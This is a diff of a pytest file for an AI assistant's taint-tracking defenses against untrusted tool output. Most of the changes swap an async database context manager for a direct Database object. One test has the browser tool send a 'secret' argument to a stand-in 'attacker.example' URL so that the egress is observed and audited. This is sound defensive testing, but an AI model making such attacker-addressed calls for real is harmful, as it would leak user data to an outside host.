@@ -5,13 +5,12 @@ import logging
 import uuid
 from dataclasses import dataclass, replace
 from datetime import UTC, datetime, timedelta
-from typing import TYPE_CHECKING, Any, Self, cast
+from typing import TYPE_CHECKING, Any, cast
 from zoneinfo import ZoneInfo
 
 import pytest
 from sqlalchemy import update
 
-from family_assistant.assistant import Assistant
 from family_assistant.config_models import AppConfig, ToolsConfig
 from family_assistant.context_providers import NotesContextProvider
 from family_assistant.delegation_security import DelegationSecurityLevel
@@ -41,8 +40,8 @@ from family_assistant.security.taint import (
     strip_legacy_labeled_echoes,
 )
 from family_assistant.services.attachment_registry import AttachmentRegistry
-from family_assistant.storage.context import (
-    get_db_context,
+from family_assistant.storage.database import (
+    Database,
     set_engine_history_taint_epoch,
 )
 from family_assistant.storage.message_history import message_history_table
@@ -368,18 +367,7 @@ async def test_prompt_note_taint_source_load_failure_propagates() -> None:
     class _FailingDbContext:
         notes = _FailingNotes()
 
-        async def __aenter__(self) -> Self:
-            return self
-
-        async def __aexit__(
-            self,
-            exc_type: object,
-            exc: object,
-            traceback: object,
-        ) -> None:
-            _ = (exc_type, exc, traceback)
-
-    async def get_context() -> _FailingDbContext:
+    def get_context() -> _FailingDbContext:
         return _FailingDbContext()
 
     provider = NotesContextProvider(
@@ -570,28 +558,28 @@ async def test_legacy_history_row_missing_taint_metadata_restores_unknown_extern
     caplog: pytest.LogCaptureFixture,
 ) -> None:
     caplog.set_level(logging.WARNING)
-    async with get_db_context(db_engine) as db_context:
-        internal_id = await db_context.message_history.add_message(
-            UserMessage(content="legacy untrusted text"),
-            interface_type="test",
-            conversation_id="legacy-taint",
-            timestamp=datetime.now(UTC),
-            turn_id="turn-legacy",
-            processing_profile_id="runtime-taint-test",
-        )
-        assert internal_id is not None
-        await db_context.execute_with_retry(
-            update(message_history_table)
-            .where(message_history_table.c.internal_id == internal_id)
-            .values(taint_metadata_json=None, taint_metadata_version=None)
-        )
+    db_context = Database(db_engine)
+    internal_id = await db_context.message_history.add_message(
+        UserMessage(content="legacy untrusted text"),
+        interface_type="test",
+        conversation_id="legacy-taint",
+        timestamp=datetime.now(UTC),
+        turn_id="turn-legacy",
+        processing_profile_id="runtime-taint-test",
+    )
+    assert internal_id is not None
+    await db_context.execute(
+        update(message_history_table)
+        .where(message_history_table.c.internal_id == internal_id)
+        .values(taint_metadata_json=None, taint_metadata_version=None)
+    )
 
-        rows = await db_context.message_history.get_recent(
-            interface_type="test",
-            conversation_id="legacy-taint",
-            limit=5,
-            processing_profile_id="runtime-taint-test",
-        )
+    rows = await db_context.message_history.get_recent(
+        interface_type="test",
+        conversation_id="legacy-taint",
+        limit=5,
+        processing_profile_id="runtime-taint-test",
+    )
 
     assert len(rows) == 1
     state = merge_history_taint(rows)
@@ -844,26 +832,26 @@ async def _seed_history_row(
     timestamp: datetime,
     taint_metadata_json: TaintMetadata | None,
 ) -> int:
-    async with get_db_context(db_engine) as db_context:
-        internal_id = await db_context.message_history.add_message(
-            UserMessage(content="history text"),
-            interface_type="test",
-            conversation_id=conversation_id,
-            timestamp=timestamp,
-            turn_id=str(uuid.uuid4()),
-            processing_profile_id="runtime-taint-test",
+    db_context = Database(db_engine)
+    internal_id = await db_context.message_history.add_message(
+        UserMessage(content="history text"),
+        interface_type="test",
+        conversation_id=conversation_id,
+        timestamp=timestamp,
+        turn_id=str(uuid.uuid4()),
+        processing_profile_id="runtime-taint-test",
+    )
+    assert internal_id is not None
+    await db_context.execute(
+        update(message_history_table)
+        .where(message_history_table.c.internal_id == internal_id)
+        .values(
+            taint_metadata_json=taint_metadata_json,
+            taint_metadata_version=(
+                "runtime_v1" if taint_metadata_json is not None else None
+            ),
         )
-        assert internal_id is not None
-        await db_context.execute_with_retry(
-            update(message_history_table)
-            .where(message_history_table.c.internal_id == internal_id)
-            .values(
-                taint_metadata_json=taint_metadata_json,
-                taint_metadata_version=(
-                    "runtime_v1" if taint_metadata_json is not None else None
-                ),
-            )
-        )
+    )
     return internal_id
 
 
@@ -871,14 +859,14 @@ async def _merged_history_state(
     db_engine: AsyncEngine,
     conversation_id: str,
 ) -> TurnTaintState:
-    async with get_db_context(db_engine) as db_context:
-        rows = await db_context.message_history.get_recent(
-            interface_type="test",
-            conversation_id=conversation_id,
-            limit=5,
-            max_age=_TEN_YEARS,
-            processing_profile_id="runtime-taint-test",
-        )
+    db_context = Database(db_engine)
+    rows = await db_context.message_history.get_recent(
+        interface_type="test",
+        conversation_id=conversation_id,
+        limit=5,
+        max_age=_TEN_YEARS,
+        processing_profile_id="runtime-taint-test",
+    )
     assert rows
     return merge_history_taint(rows)
 
@@ -1102,27 +1090,6 @@ async def test_post_epoch_row_preserves_hidden_max_tier_after_echo_stripping(
         LEGACY_MISSING_TAINT_METADATA_LABEL not in source.labels
         for source in state.sources
     )
-
-
-@pytest.mark.asyncio
-async def test_worker_engine_inherits_history_taint_epoch(
-    db_engine: AsyncEngine,
-) -> None:
-    assistant = Assistant(
-        config=AppConfig(
-            taint_policy=TaintPolicyConfig(history_taint_epoch=_HISTORY_TAINT_EPOCH)
-        ),
-        database_engine=db_engine,
-    )
-    assistant.database_engine = db_engine
-
-    worker_engine = assistant.create_worker_engine()
-    try:
-        async with get_db_context(worker_engine) as db_context:
-            assert db_context.history_taint_epoch == _HISTORY_TAINT_EPOCH
-    finally:
-        if worker_engine is not db_engine:
-            await worker_engine.dispose()
 
 
 @pytest.mark.asyncio
@@ -1373,23 +1340,23 @@ async def test_tool_output_tags_update_turn_taint(
 ) -> None:
     provider = _tainting_provider()
     tracker = InMemoryTurnTaintTracker()
-    async with get_db_context(db_engine) as db_context:
-        context = _minimal_context(db_context, tracker)
+    db_context = Database(db_engine)
+    context = _minimal_context(db_context, tracker)
 
-        await provider.execute_tool("trusted_tool", {}, context, "call_trusted")
-        assert tracker.snapshot().max_tier is SourceTrustTier.TRUSTED_USER
-        assert (
-            context.tool_result_taint_metadata["call_trusted"].get("max_tier")
-            == "trusted_user"
-        )
+    await provider.execute_tool("trusted_tool", {}, context, "call_trusted")
+    assert tracker.snapshot().max_tier is SourceTrustTier.TRUSTED_USER
+    assert (
+        context.tool_result_taint_metadata["call_trusted"].get("max_tier")
+        == "trusted_user"
+    )
 
-        await provider.execute_tool("untrusted_tool", {}, context, "call_untrusted")
-        assert tracker.snapshot().max_tier is SourceTrustTier.UNKNOWN_EXTERNAL
-        assert (
-            context.tool_result_taint_metadata["call_untrusted"].get("max_tier")
-            == "unknown_external"
-        )
-        audit_events = await db_context.taint_audit_events.list_for_turn("turn-direct")
+    await provider.execute_tool("untrusted_tool", {}, context, "call_untrusted")
+    assert tracker.snapshot().max_tier is SourceTrustTier.UNKNOWN_EXTERNAL
+    assert (
+        context.tool_result_taint_metadata["call_untrusted"].get("max_tier")
+        == "unknown_external"
+    )
+    audit_events = await db_context.taint_audit_events.list_for_turn("turn-direct")
 
     result_events = [
         event for event in audit_events if event["event_type"] == "result_taint"
@@ -1409,10 +1376,10 @@ async def test_unspecified_tool_output_defaults_to_unknown_external(
 ) -> None:
     provider = _tainting_provider()
     tracker = InMemoryTurnTaintTracker()
-    async with get_db_context(db_engine) as db_context:
-        context = _minimal_context(db_context, tracker)
+    db_context = Database(db_engine)
+    context = _minimal_context(db_context, tracker)
 
-        await provider.execute_tool("unspecified_tool", {}, context, "call_legacy")
+    await provider.execute_tool("unspecified_tool", {}, context, "call_legacy")
 
     assert tracker.snapshot().max_tier is SourceTrustTier.UNKNOWN_EXTERNAL
     assert context.tool_result_taint_metadata["call_legacy"].get("max_tier") == (
@@ -1432,10 +1399,10 @@ async def test_unspecified_tool_output_uses_configured_default_tier(
         ),
     )
     tracker = InMemoryTurnTaintTracker()
-    async with get_db_context(db_engine) as db_context:
-        context = _minimal_context(db_context, tracker)
+    db_context = Database(db_engine)
+    context = _minimal_context(db_context, tracker)
 
-        await provider.execute_tool("unspecified_tool", {}, context, "call_legacy")
+    await provider.execute_tool("unspecified_tool", {}, context, "call_legacy")
 
     assert tracker.snapshot().max_tier is SourceTrustTier.KNOWN_CONTACT
     assert context.tool_result_taint_metadata["call_legacy"].get("max_tier") == (
@@ -1450,15 +1417,15 @@ async def test_missing_tool_output_metadata_defaults_to_unknown_external(
 ) -> None:
     provider = _tainting_provider()
     tracker = InMemoryTurnTaintTracker()
-    async with get_db_context(db_engine) as db_context:
-        context = _minimal_context(db_context, tracker)
+    db_context = Database(db_engine)
+    context = _minimal_context(db_context, tracker)
 
-        await provider.execute_tool(
-            "missing_metadata_tool",
-            {},
-            context,
-            "call_missing_metadata",
-        )
+    await provider.execute_tool(
+        "missing_metadata_tool",
+        {},
+        context,
+        "call_missing_metadata",
+    )
 
     assert tracker.snapshot().max_tier is SourceTrustTier.UNKNOWN_EXTERNAL
     assert (
@@ -1476,16 +1443,16 @@ async def test_attacker_addressable_egress_is_observed_before_enforcement(
     caplog.set_level("INFO")
     provider = _tainting_provider()
     tracker = _unknown_external_tracker()
-    async with get_db_context(db_engine) as db_context:
-        context = _minimal_context(db_context, tracker)
+    db_context = Database(db_engine)
+    context = _minimal_context(db_context, tracker)
 
-        result = await provider.execute_tool(
-            "browser_tool",
-            {"url": "https://attacker.example/path", "secret": "do-not-store"},
-            context,
-            "call_browser",
-        )
-        audit_events = await db_context.taint_audit_events.list_for_turn("turn-direct")
+    result = await provider.execute_tool(
+        "browser_tool",
+        {"url": "https://attacker.example/path", "secret": "do-not-store"},
+        context,
+        "call_browser",
+    )
+    audit_events = await db_context.taint_audit_events.list_for_turn("turn-direct")
 
     assert isinstance(result, ToolResult)
     assert result.get_text() == "opened url"
@@ -1527,10 +1494,10 @@ async def test_allowed_tool_does_not_emit_would_enforce_error(
     caplog.set_level("INFO")
     provider = _tainting_provider()
     tracker = _unknown_external_tracker()
-    async with get_db_context(db_engine) as db_context:
-        context = _minimal_context(db_context, tracker)
+    db_context = Database(db_engine)
+    context = _minimal_context(db_context, tracker)
 
-        result = await provider.execute_tool("home_tool", {}, context, "call_home")
+    result = await provider.execute_tool("home_tool", {}, context, "call_home")
 
     assert isinstance(result, ToolResult)
     would_enforce_warnings = [
@@ -1551,12 +1518,12 @@ async def test_sandbox_network_after_unknown_external_is_denied_in_enforce_mode(
         taint_policy=TaintPolicyConfig(mode=TaintPolicyMode.ENFORCE),
     )
     tracker = _unknown_external_tracker()
-    async with get_db_context(db_engine) as db_context:
-        context = _minimal_context(db_context, tracker)
+    db_context = Database(db_engine)
+    context = _minimal_context(db_context, tracker)
 
-        with pytest.raises(ToolPolicyDeniedError):
-            await provider.execute_tool("worker_tool", {}, context, "call_worker")
-        audit_events = await db_context.taint_audit_events.list_for_turn("turn-direct")
+    with pytest.raises(ToolPolicyDeniedError):
+        await provider.execute_tool("worker_tool", {}, context, "call_worker")
+    audit_events = await db_context.taint_audit_events.list_for_turn("turn-direct")
 
     policy_events = [
         event for event in audit_events if event["event_type"] == "policy_evaluation"
@@ -1579,19 +1546,19 @@ async def test_script_nested_tool_calls_recheck_current_taint(
         taint_policy=TaintPolicyConfig(mode=TaintPolicyMode.ENFORCE),
     )
     tracker = InMemoryTurnTaintTracker()
-    async with get_db_context(db_engine) as db_context:
-        context = _minimal_context(db_context, tracker)
-        engine = MontyEngine(tools_provider=provider)
+    db_context = Database(db_engine)
+    context = _minimal_context(db_context, tracker)
+    engine = MontyEngine(tools_provider=provider)
 
-        with pytest.raises(ScriptExecutionError, match="worker_tool"):
-            await engine.evaluate_async(
-                """
+    with pytest.raises(ScriptExecutionError, match="worker_tool"):
+        await engine.evaluate_async(
+            """
 tools_execute("untrusted_tool")
 tools_execute("worker_tool")
 """,
-                execution_context=context,
-            )
-        audit_events = await db_context.taint_audit_events.list_for_turn("turn-direct")
+            execution_context=context,
+        )
+    audit_events = await db_context.taint_audit_events.list_for_turn("turn-direct")
 
     policy_events = [
         event for event in audit_events if event["event_type"] == "policy_evaluation"
@@ -1621,11 +1588,11 @@ async def test_redact_outcome_is_blocked_until_adapter_exists(
         ),
     )
     tracker = _unknown_external_tracker()
-    async with get_db_context(db_engine) as db_context:
-        context = _minimal_context(db_context, tracker)
+    db_context = Database(db_engine)
+    context = _minimal_context(db_context, tracker)
 
-        with pytest.raises(ToolPolicyDeniedError, match="redaction outcomes"):
-            await provider.execute_tool("browser_tool", {}, context, "call_browser")
+    with pytest.raises(ToolPolicyDeniedError, match="redaction outcomes"):
+        await provider.execute_tool("browser_tool", {}, context, "call_browser")
 
 
 @pytest.mark.asyncio
@@ -1636,22 +1603,19 @@ async def test_untrusted_tool_taint_persists_to_history_and_later_turn(
     conversation_id = "runtime-taint-conversation"
     first_service = _processing_service(_first_call_then_final("untrusted_tool"))
 
-    async with get_db_context(db_engine) as db_context:
-        first_result = await first_service.handle_chat_interaction(
-            db_context=db_context,
-            interface_type="web",
-            conversation_id=conversation_id,
-            trigger_content_parts=[{"type": "text", "text": "Fetch the page"}],
-            trigger_interface_message_id=None,
-            user_name="Test User",
-            turn_id=first_turn_id,
-            save_history_with_isolated_context=False,
-        )
+    db_context = Database(db_engine)
+    first_result = await first_service.handle_chat_interaction(
+        db_context=db_context,
+        interface_type="web",
+        conversation_id=conversation_id,
+        trigger_content_parts=[{"type": "text", "text": "Fetch the page"}],
+        trigger_interface_message_id=None,
+        user_name="Test User",
+        turn_id=first_turn_id,
+    )
 
-        assert first_result.status.value == "success"
-        first_turn_messages = await db_context.message_history.get_by_turn_id(
-            first_turn_id
-        )
+    assert first_result.status.value == "success"
+    first_turn_messages = await db_context.message_history.get_by_turn_id(first_turn_id)
 
     tool_messages = [
         message for message in first_turn_messages if isinstance(message, ToolMessage)
@@ -1669,21 +1633,20 @@ async def test_untrusted_tool_taint_persists_to_history_and_later_turn(
 
     second_turn_id = "runtime-taint-turn-2"
     second_service = _processing_service(_clean_final_response("history reply"))
-    async with get_db_context(db_engine) as db_context:
-        second_result = await second_service.handle_chat_interaction(
-            db_context=db_context,
-            interface_type="web",
-            conversation_id=conversation_id,
-            trigger_content_parts=[{"type": "text", "text": "Thanks"}],
-            trigger_interface_message_id=None,
-            user_name="Test User",
-            turn_id=second_turn_id,
-            save_history_with_isolated_context=False,
-        )
-        assert second_result.status.value == "success"
-        second_turn_messages = await db_context.message_history.get_by_turn_id(
-            second_turn_id
-        )
+    db_context = Database(db_engine)
+    second_result = await second_service.handle_chat_interaction(
+        db_context=db_context,
+        interface_type="web",
+        conversation_id=conversation_id,
+        trigger_content_parts=[{"type": "text", "text": "Thanks"}],
+        trigger_interface_message_id=None,
+        user_name="Test User",
+        turn_id=second_turn_id,
+    )
+    assert second_result.status.value == "success"
+    second_turn_messages = await db_context.message_history.get_by_turn_id(
+        second_turn_id
+    )
 
     second_assistant_messages = [
         message
@@ -1706,33 +1669,33 @@ async def test_tainted_note_write_stores_label_and_reread_restores_taint(
     db_engine: AsyncEngine,
 ) -> None:
     write_tracker = _unknown_external_tracker()
-    async with get_db_context(db_engine) as db_context:
-        write_context = _minimal_context(db_context, write_tracker)
-        result = await add_or_update_note_tool(
-            exec_context=write_context,
-            title="External digest",
-            content="Summary of external content",
-        )
-        assert "successfully" in result
+    db_context = Database(db_engine)
+    write_context = _minimal_context(db_context, write_tracker)
+    result = await add_or_update_note_tool(
+        exec_context=write_context,
+        title="External digest",
+        content="Summary of external content",
+    )
+    assert "successfully" in result
 
-        note = await db_context.notes.get_by_title(
-            "External digest",
-            visibility_grants=None,
-        )
-        assert note is not None
-        assert note.visibility_labels == []
-        assert note.provenance_metadata is not None
-        assert note.provenance_metadata.get("provenance_labels") == [
-            "source_unknown_external"
-        ]
-        taint_metadata = note.provenance_metadata.get("taint_metadata")
-        assert isinstance(taint_metadata, dict)
-        assert taint_metadata.get("max_tier") == "unknown_external"
+    note = await db_context.notes.get_by_title(
+        "External digest",
+        visibility_grants=None,
+    )
+    assert note is not None
+    assert note.visibility_labels == []
+    assert note.provenance_metadata is not None
+    assert note.provenance_metadata.get("provenance_labels") == [
+        "source_unknown_external"
+    ]
+    taint_metadata = note.provenance_metadata.get("taint_metadata")
+    assert isinstance(taint_metadata, dict)
+    assert taint_metadata.get("max_tier") == "unknown_external"
 
     read_tracker = InMemoryTurnTaintTracker()
-    async with get_db_context(db_engine) as db_context:
-        read_context = _minimal_context(db_context, read_tracker)
-        note_result = await get_note_tool("External digest", read_context)
+    db_context = Database(db_engine)
+    read_context = _minimal_context(db_context, read_tracker)
+    note_result = await get_note_tool("External digest", read_context)
 
     assert note_result.data is not None
     assert read_tracker.snapshot().max_tier is SourceTrustTier.UNKNOWN_EXTERNAL
@@ -1743,18 +1706,18 @@ async def test_prompt_included_note_surfaces_stored_provenance_taint(
     db_engine: AsyncEngine,
 ) -> None:
     write_tracker = _unknown_external_tracker()
-    async with get_db_context(db_engine) as db_context:
-        write_context = _minimal_context(db_context, write_tracker)
-        result = await add_or_update_note_tool(
-            exec_context=write_context,
-            title="Prompt external digest",
-            content="External content copied into a prompt note.",
-            include_in_prompt=True,
-        )
-        assert "successfully" in result
+    db_context = Database(db_engine)
+    write_context = _minimal_context(db_context, write_tracker)
+    result = await add_or_update_note_tool(
+        exec_context=write_context,
+        title="Prompt external digest",
+        content="External content copied into a prompt note.",
+        include_in_prompt=True,
+    )
+    assert "successfully" in result
 
-    async def get_context() -> Any:  # noqa: ANN401 - repository context manager
-        return get_db_context(db_engine)
+    def get_context() -> Database:
+        return Database(db_engine)
 
     provider = NotesContextProvider(get_context, prompts={})
 
@@ -1787,10 +1750,10 @@ async def test_full_document_read_restores_stored_provenance_taint(
     )
 
     read_tracker = InMemoryTurnTaintTracker()
-    async with get_db_context(db_engine) as db_context:
-        document_id = await db_context.vector.add_document(document)
-        read_context = _minimal_context(db_context, read_tracker)
-        result = await get_full_document_content_tool(read_context, document_id)
+    db_context = Database(db_engine)
+    document_id = await db_context.vector.add_document(document)
+    read_context = _minimal_context(db_context, read_tracker)
+    result = await get_full_document_content_tool(read_context, document_id)
 
     assert isinstance(result, str)
     assert "no content is available" in result
@@ -1814,28 +1777,28 @@ async def test_text_attachment_read_restores_stored_provenance_taint(
     )
     read_tracker = InMemoryTurnTaintTracker()
 
-    async with get_db_context(db_engine) as db_context:
-        attachment = await registry.store_and_register_tool_attachment(
-            file_content=b"external attachment text\n",
-            filename="external.txt",
-            content_type="text/plain",
-            tool_name="test_tool",
-            metadata={
-                "source_trust_tier": "unknown_external",
-                "provenance_labels": ["source_unknown_external"],
-                "taint_metadata": provenance_state.to_metadata(),
-            },
-            db_context=db_context,
-        )
-        read_context = _minimal_context(
-            db_context,
-            read_tracker,
-            attachment_registry=registry,
-        )
-        result = await read_text_attachment_tool(
-            read_context,
-            attachment.attachment_id,
-        )
+    db_context = Database(db_engine)
+    attachment = await registry.store_and_register_tool_attachment(
+        file_content=b"external attachment text\n",
+        filename="external.txt",
+        content_type="text/plain",
+        tool_name="test_tool",
+        metadata={
+            "source_trust_tier": "unknown_external",
+            "provenance_labels": ["source_unknown_external"],
+            "taint_metadata": provenance_state.to_metadata(),
+        },
+        db_context=db_context,
+    )
+    read_context = _minimal_context(
+        db_context,
+        read_tracker,
+        attachment_registry=registry,
+    )
+    result = await read_text_attachment_tool(
+        read_context,
+        attachment.attachment_id,
+    )
 
     assert result.text is not None
     assert "external attachment text" in result.text
@@ -1853,16 +1816,16 @@ async def test_list_notes_preview_restores_stored_provenance_taint(
     provenance_state = _unknown_external_tracker().snapshot()
     read_tracker = InMemoryTurnTaintTracker()
 
-    async with get_db_context(db_engine) as db_context:
-        await db_context.notes.add_or_update(
-            title="tainted listed note",
-            content="attacker preview text",
-            include_in_prompt=False,
-            provenance_metadata={"taint_metadata": provenance_state.to_metadata()},
-            write_policy=NoteWritePolicy.UNCONSTRAINED,
-        )
-        read_context = _minimal_context(db_context, read_tracker)
-        result = await list_notes_tool(read_context)
+    db_context = Database(db_engine)
+    await db_context.notes.add_or_update(
+        title="tainted listed note",
+        content="attacker preview text",
+        include_in_prompt=False,
+        provenance_metadata={"taint_metadata": provenance_state.to_metadata()},
+        write_policy=NoteWritePolicy.UNCONSTRAINED,
+    )
+    read_context = _minimal_context(db_context, read_tracker)
+    result = await list_notes_tool(read_context)
 
     assert any(note["title"] == "tainted listed note" for note in result)
     read_state = read_tracker.snapshot()
@@ -1888,28 +1851,28 @@ async def test_tainted_attachment_arguments_are_merged_before_sink_policy(
     provider = _tainting_provider()
     tracker = InMemoryTurnTaintTracker()
 
-    async with get_db_context(db_engine) as db_context:
-        attachment = await registry.store_and_register_tool_attachment(
-            file_content=b"external attachment text\n",
-            filename="external.txt",
-            content_type="text/plain",
-            tool_name="test_tool",
-            metadata={"taint_metadata": provenance_state.to_metadata()},
-            db_context=db_context,
-        )
-        context = _minimal_context(
-            db_context,
-            tracker,
-            attachment_registry=registry,
-        )
+    db_context = Database(db_engine)
+    attachment = await registry.store_and_register_tool_attachment(
+        file_content=b"external attachment text\n",
+        filename="external.txt",
+        content_type="text/plain",
+        tool_name="test_tool",
+        metadata={"taint_metadata": provenance_state.to_metadata()},
+        db_context=db_context,
+    )
+    context = _minimal_context(
+        db_context,
+        tracker,
+        attachment_registry=registry,
+    )
 
-        await provider.execute_tool(
-            "browser_tool",
-            {"attachment_ids": [attachment.attachment_id]},
-            context,
-            "call_browser_with_attachment",
-        )
-        audit_events = await db_context.taint_audit_events.list_for_turn("turn-direct")
+    await provider.execute_tool(
+        "browser_tool",
+        {"attachment_ids": [attachment.attachment_id]},
+        context,
+        "call_browser_with_attachment",
+    )
+    audit_events = await db_context.taint_audit_events.list_for_turn("turn-direct")
 
     assert tracker.snapshot().max_tier is SourceTrustTier.UNKNOWN_EXTERNAL
     policy_events = [
@@ -1964,28 +1927,28 @@ async def test_tainted_schema_attachment_argument_without_id_name_is_merged(
     )
     tracker = InMemoryTurnTaintTracker()
 
-    async with get_db_context(db_engine) as db_context:
-        attachment = await registry.store_and_register_tool_attachment(
-            file_content=b"external image bytes\n",
-            filename="external.png",
-            content_type="image/png",
-            tool_name="test_tool",
-            metadata={"taint_metadata": provenance_state.to_metadata()},
-            db_context=db_context,
-        )
-        context = _minimal_context(
-            db_context,
-            tracker,
-            attachment_registry=registry,
-        )
+    db_context = Database(db_engine)
+    attachment = await registry.store_and_register_tool_attachment(
+        file_content=b"external image bytes\n",
+        filename="external.png",
+        content_type="image/png",
+        tool_name="test_tool",
+        metadata={"taint_metadata": provenance_state.to_metadata()},
+        db_context=db_context,
+    )
+    context = _minimal_context(
+        db_context,
+        tracker,
+        attachment_registry=registry,
+    )
 
-        await provider.execute_tool(
-            "transform_like_tool",
-            {"image": attachment.attachment_id},
-            context,
-            "call_transform_like_tool",
-        )
-        audit_events = await db_context.taint_audit_events.list_for_turn("turn-direct")
+    await provider.execute_tool(
+        "transform_like_tool",
+        {"image": attachment.attachment_id},
+        context,
+        "call_transform_like_tool",
+    )
+    audit_events = await db_context.taint_audit_events.list_for_turn("turn-direct")
 
     assert tracker.snapshot().max_tier is SourceTrustTier.UNKNOWN_EXTERNAL
     policy_events = [
@@ -2045,18 +2008,18 @@ async def test_completed_taint_confirmation_records_result_taint(
             result=ToolResult(text="confirmed external output"),
         )
 
-    async with get_db_context(db_engine) as db_context:
-        context = replace(
-            _minimal_context(db_context, tracker),
-            request_confirmation_callback=_completed_confirmation,
-        )
-        result = await provider.execute_tool(
-            "confirmed_browser_untrusted",
-            {},
-            context,
-            "call_confirmed_external",
-        )
-        audit_events = await db_context.taint_audit_events.list_for_turn("turn-direct")
+    db_context = Database(db_engine)
+    context = replace(
+        _minimal_context(db_context, tracker),
+        request_confirmation_callback=_completed_confirmation,
+    )
+    result = await provider.execute_tool(
+        "confirmed_browser_untrusted",
+        {},
+        context,
+        "call_confirmed_external",
+    )
+    audit_events = await db_context.taint_audit_events.list_for_turn("turn-direct")
 
     assert isinstance(result, ToolResult)
     assert result.text == "confirmed external output"
@@ -2131,17 +2094,17 @@ async def test_completed_taint_confirmation_merges_worker_metadata(
             taint_metadata=worker_taint.to_metadata(),
         )
 
-    async with get_db_context(db_engine) as db_context:
-        context = replace(
-            _minimal_context(db_context, tracker),
-            request_confirmation_callback=_completed_confirmation,
-        )
-        result = await provider.execute_tool(
-            "confirmed_dynamic_read",
-            {},
-            context,
-            "call_confirmed_dynamic",
-        )
+    db_context = Database(db_engine)
+    context = replace(
+        _minimal_context(db_context, tracker),
+        request_confirmation_callback=_completed_confirmation,
+    )
+    result = await provider.execute_tool(
+        "confirmed_dynamic_read",
+        {},
+        context,
+        "call_confirmed_dynamic",
+    )
 
     assert isinstance(result, ToolResult)
     assert result.text == "confirmed note contents"
@@ -2186,16 +2149,16 @@ async def test_dynamic_provenance_added_by_trusted_read_is_persisted_on_result(
     )
     tracker = InMemoryTurnTaintTracker()
 
-    async with get_db_context(db_engine) as db_context:
-        context = _minimal_context(db_context, tracker)
+    db_context = Database(db_engine)
+    context = _minimal_context(db_context, tracker)
 
-        await provider.execute_tool(
-            "dynamic_taint_read",
-            {},
-            context,
-            "call_dynamic_read",
-        )
-        audit_events = await db_context.taint_audit_events.list_for_turn("turn-direct")
+    await provider.execute_tool(
+        "dynamic_taint_read",
+        {},
+        context,
+        "call_dynamic_read",
+    )
+    audit_events = await db_context.taint_audit_events.list_for_turn("turn-direct")
 
     assert (
         context.tool_result_taint_metadata["call_dynamic_read"].get("max_tier")
